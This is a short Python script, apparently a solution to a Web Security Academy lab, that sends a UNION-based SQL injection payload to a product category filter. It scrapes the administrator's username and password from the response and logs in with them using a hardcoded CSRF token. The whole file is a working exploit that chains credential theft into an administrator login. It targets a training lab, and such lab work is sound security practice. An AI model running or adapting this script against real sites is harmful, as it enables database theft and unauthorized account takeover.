import requests
from bs4 import BeautifulSoup

url = "https://0a7600a9037bbf4986e3c63e00730090.web-security-academy.net/filter?category="
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
}
sqli = "' UNION SELECT * FROM users--"
print(url + sqli.replace(" ", "+"))
response = requests.get(url=(url + sqli), headers=headers)
rows = ""
soup = BeautifulSoup(response.text, 'html.parser')
rows = soup.find_all('tr')
adminInfo = dict()
for row in rows:
    userData = row.find_all('th')
    username = userData[0].get_text()
    passwordData = row.find_all('td')
    password = passwordData[0].get_text()
    if username == "administrator":
        adminInfo['username'] = username
        adminInfo['password'] = password
        adminInfo['csrf'] = "Q1PBO8n6AxwJFwFqcTjsWcPTgEqGaAQM"
print(adminInfo)    
loginUrl = "https://0a7600a9037bbf4986e3c63e00730090.web-security-academy.net/login"
response = requests.post(url=loginUrl, headers=headers, data=adminInfo)
print(response.text)
print("You solve the lab!")

